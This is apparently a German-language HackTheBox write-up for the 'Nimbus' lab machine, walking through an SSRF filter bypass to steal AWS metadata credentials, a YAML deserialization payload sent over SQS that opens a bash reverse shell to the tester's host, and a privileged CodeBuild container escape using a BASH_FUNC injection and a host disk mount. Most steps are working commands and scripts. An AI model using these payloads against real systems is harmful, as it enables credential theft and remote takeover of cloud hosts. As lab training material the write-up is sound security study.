#  🎯 HackTheBox — Nimbus 

 **  Schwierigkeitsgrad:  **   `Schwer`  ·  **  Betriebssystem:  **   `Linux`  ·  **  Kategorie:  **   `Cloud-/Container-Ausbruch` 

 !  [  Status  ](  https://img.shields.io/badge/Status-Rooted-success  ) 
 !  [  Plattform  ](  https://img.shields.io/badge/Platform-HackTheBox-red  ) 

 *  Von  [  @timgad794  ](  https://github.com/timgad794  )  * 

 --- 

 ##  📋 Exploit-Chain 

 ``` 
 SSRF → AWS IMDS → SQS → YAML-Deserialisierung (RCE) 
 → LocalStack Admin → CodeBuild Privileged Container 
 → BASH_FUNC Injection → Host Filesystem Mount → ROOT 
 ``` 

 --- 

 ##  🖼️ Impressionen 

 **  Ziel-Webanwendung:  ** 
 !  [  Nimbus Home  ](  images/01-nimbus-home.png  ) 

 **  Initialer Nmap-Scan:  ** 
 !  [  Nmap Scan  ](  images/02-nmap.png  ) 

 --- 

 ##  🛠️ Schritt 1 — Recon 

 ```  bash 
 echo   "10.129.143.155 nimbus.htb aws.nimbus.htb"   |   sudo   tee   -a  /etc/hosts 

 nmap -p- --min-rate  5000   -T4   -oN  nmap_all.txt nimbus.htb 
 nmap  -p   22,80   -sV   -sC   -oN  nmap_detail.txt nimbus.htb 
 ``` 

 **  Ergebnis:  **   `22/tcp SSH`  ·  `80/tcp HTTP (nginx)` 

 `/api/v1/health`  zeigt  `aws.nimbus.htb`  →  **  LocalStack  **  -Emulator. 

 --- 

 ##  🛠️ Schritt 2 — SSRF → IMDS 

 Zwei Filter umgehen: 
 |  Filter  |  Bypass | 
 |  ---  |  ---  | 
 |   `.yaml`  -Suffix  |  Fragment  `?.yaml`   | 
 |  Interne-IP-Block  |   **  Decimal-IP  **   `169.254.169.254`  =  `2852039166`   | 

 ```  bash 
 curl   -s   -X  POST http://nimbus.htb/jobs/preview  \ 
 --data-urlencode  'url=http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?.yaml' 
 ``` 

 Antwort liefert  `AccessKeyId`  ,  `SecretAccessKey`  ,  `Token`  für  `nimbus-web-role`  . 

 ```  bash 
 export   AWS_ACCESS_KEY_ID  =  "..."   AWS_SECRET_ACCESS_KEY  =  " ..."   AWS_SESSION_TOKEN  =  "..." 
 export   AWS_DEFAULT_REGION  =  "us-east-1" 
 aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity 
 ``` 

 --- 

 ##  🛠️ Schritt 3 — SQS → Worker RCE 

 ```  bash 
 aws --endpoint-url http://aws.nimbus.htb sqs list-queues 
 # → http://floci:4566/847219365028/nimbus-jobs 
 ``` 

 **  Schwachstelle:  **  Worker parsed SQS-Nachrichten mit unsicherem  `yaml.load`  . 

 **  Reverse Shell senden:  ** 

 ```  bash 
 python3 -  <<  'PY' 
 import boto3 
 AK='...'; SK='...'; TOK='...'; LHOST='10.10.16.96' 
 s = boto3.Session(aws_access_key_id=AK, aws_secret_access_key=SK, 
 aws_session_token=TOK, region_name='us-east-1') 
sqs = s.client('sqs', endpoint_url='http://aws.nimbus.htb') 
 payload = f"""!!python/object/apply:subprocess.Popen 
 - - bash 
 - -c 
 - 'bash -i >& /dev/tcp/{LHOST}/4444 0>&1'""" 
 print(sqs.send_message( 
 QueueUrl='http://floci:4566/847219365028/nimbus-jobs', 
 MessageBody=payload)['MessageId']) 
 PY 
 ``` 

 Listener parallel: 
 ```  bash 
 nc   -lvnp   4444 
 ``` 

 →  **  User-Flag  **  in  `/home/worker/user.txt`  ✅ 

 --- 

 ##  🛠️ Schritt 4 — LocalStack Admin 

 Im Container ist die API  **  ohne SigV4-Prüfung  **  erreichbar: 

 ```  bash 
 python3  -c   " 
 import boto3 
 c = dict(endpoint_url='http://floci:4566', aws_access_key_id='test', 
 aws_secret_access_key='test', region_name='us-east-1') 
 print(boto3.client('sts', **c).get_caller_identity()) 
 " 
 # → arn:aws:iam::847219365028:root 
 ``` 

 --- 

 ##  🛠️ Schritt 5 — CodeBuild Privileged Container 

 **  Konzept:  **   `privilegedMode: True`  → alle Caps + Host-Devices (  `/dev/sda*`  ). 

 **  Falle:  **  floci's Entrypoint nutzt  „gosu“  für Privilege-Drop. 

 **  Trick:  **  Bash-Funktion per Env-Var injizieren: 

 ``` 
 BASH_FUNC_id%% = () { echo uid=1000 gid=1000 groups=1000; } 
``` 

 →  `gosu`  sieht Fake-Output, überspringt Drop, Container bleibt  **  root + privilegiert  **  . 

 --- 

 ##  🛠️ Schritt 6 — Host Mount → ROOT 

 **  Problem:  **  floci-Image hat kein  `mount`  /  `python3`  . Wir laden statisches  **  Busybox  **  vom Kali. 

 **  Kali:  ** 
 ```  bash 
 cd  /tmp 
 wget   -q  https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox  -O  bb2 
 chmod  +x bb2 
 python3  -m  http.server  8080   --bind   0.0  .0.0 
 ``` 

 **  Worker-Container:  ** 
 ```  bash 
 cat   >  /tmp/zz2.py  <<  'PYEOF' 
 import boto3, uuid, time 
 EP="http://floci:4566"; KALI="10.10.16.96" 
 FUNC="() { echo uid=1000 gid=1000 groups=1000; }" 

 spec = """version: 0.2 
 phases: 
 build: 
 commands: 
 - id 
 - whoami 
 - curl -s -m 20 -o /tmp/busybox http://""" + KALI + """:8080/bb2 
 - chmod +x /tmp/busybox 
 - mkdir -p /mnt/host 
 - /tmp/busybox mount -t ext4 /dev/sda4 /mnt/host && echo MOUNT-OK 
 - /tmp/busybox cat /mnt/host/root/root.txt 
 - echo DONE && exit 1 
 """ 

 cb = boto3.client("codebuild", endpoint_url=EP, region_name="us-east-1", 
 aws_access_key_id="test", aws_secret_access_key="test") 
proj = "esc-" + uuid.uuid4().hex[:6] 
 cb.create_project(name=proj, source={"type": "NO_SOURCE"}, 
 environment={"type":"LINUX_CONTAINER","image":"floci/floci:latest", 
 "computeType":"BUILD_GENERAL1_SMALL","privilegedMode":True, 
 "environmentVariables":[{"name":"BASH_FUNC_id%%","value":FUNC}]}, 
 serviceRole="arn:aws:iam::847219365028:role/codebuild-role", 
 artifacts={"type":"NO_ARTIFACTS"}) 
 r = cb.start_build(projectName=proj, buildspecOverride=spec, 
 environmentVariablesOverride=[{"name":"BASH_FUNC_id%%","value":FUNC}]) 
 bid = r["build"]["id"] 
 for i in range(20): 
 time.sleep(4) 
 b = cb.batch_get_builds(ids=[bid])["builds"][0] 
 print(b["buildStatus"]) 
 if b["buildStatus"] in ("SUCCEEDED","FAILED","FAULT,"STOPPED"): 
 for p in b["phases"]: 
 if p.get("contexts"): 
 print(p["contexts"][0].get("message","")[:2500]) 
 break 
 PYEOF 
 python3 /tmp/zz2.py 
 ``` 

 **  Log zeigt:  ** 
 ``` 
 uid=1000 gid=1000 groups=1000 
 root 
 MOUNT-OK 
 ... 
 <root-flag> ← 🔴 
 DONE 
 ``` 

→  ** Root-Flag **  gelesen ✅ 

--- 

##  📚 Kernkonzepte 

|  Konzept  |  Anwendung  | 
| --- | --- | 
|  Decimal-IP-Bypass  |  `169.254.169.254`  →  `2852039166`  | 
|  Fragment-Suffix-Bypass  |  `?.yaml`  umgeht Endungs-Check  | 
|  YAML Deserialization  |  `yaml.load`  +  `!!python/object/apply`  | 
|  Unsigned LocalStack  |  `test/test`  = Admin ohne SigV4  | 
|  Privileged Container  |  `privilegedMode: True`  + Host-Devices  | 
|  BASH_FUNC Env Injection  |  Funktions-Override  `BASH_FUNC_id%%`  | 
|  gosu-Bypass  |  Fake- `id` -Output täuscht Privilege-Drop  | 
|  busybox  |  Universal-Tool bei leerem Image  | 

--- 

##  ⚠️ Disclaimer 

Ausschließlich für autorisierte Penetration auf der HackTheBox-Plattform. 

< div  align = " center " > 

** ⭐ Wenn's geholfen hat — Stern da lassen! ** 

</ div 
